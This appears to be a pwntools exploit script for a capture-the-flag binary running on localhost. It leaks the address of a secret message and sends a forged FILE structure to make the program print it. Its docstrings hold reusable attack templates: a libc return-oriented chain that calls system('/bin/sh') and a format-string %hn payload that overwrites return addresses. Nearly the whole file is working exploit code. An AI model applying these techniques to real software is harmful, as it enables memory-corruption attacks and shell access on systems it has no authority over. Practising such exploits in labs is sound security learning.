#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

"""
ROP

- ELF : elf
rop_elf = ROP(elf)
ret = p(rop_elf.find_gadget(['ret'])[0])

- libc : libc
rop = ROP(libc)
pop_rdi = p(rop.find_gadget(['pop rdi', 'ret'])[0])
ret = p(rop.find_gadget(['ret'])[0])
binsh = p(next(libc.search(b'/bin/sh\x00')))
system = p(libc.sym["system"])

rop_chain = [
    pop_rdi,
    binsh,
    ret,
    system
]
"""

"""
fmtstr

#value change to:
value = 0x7fffffffe6c0  # exmaple value

lower_16 = value & 0xffff 
middle_16 = (65536 - lower_16) + ((value >> 16) & 0xffff) 
high_16 = (65536 - ((value >> 16) & 0xffff)) + ((value >> 32) & 0xffff)
f"%{lower_16}c%15$hn%{middle_16}c%16$hn%{high_16}c%17$hn".encode().ljust(40,b'\x00') + rop_chain + p64(ret_to_main_ptr) + p64(ret_to_main_ptr+2) + p64(ret_to_main_ptr+4)
mega pop: pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
"""

binary = "./test2"
_libc = "./"
_ld = "./"
HOST = 'localhost'
port = 1337
_arch = 64

context.log_level = 'debug'
context.binary = elf = ELF(binary, checksec=False)


#libc = ELF(_libc, checksec=False)
# _ld = ELF(_ld, checksec=False)
libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
breakrva ?
b *main
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

io = start()
rcu(b'secret_message is located at: ')
secret = int(io.recvline()[:-1].strip(), 16)
success(f"secret_message: {hex(secret)}")
fs = FileStructure()
payload = fs.write(secret, 60)
print(fs)
rcu(b'Overwriting file_pointer\n')
s(payload)
io.interactive()
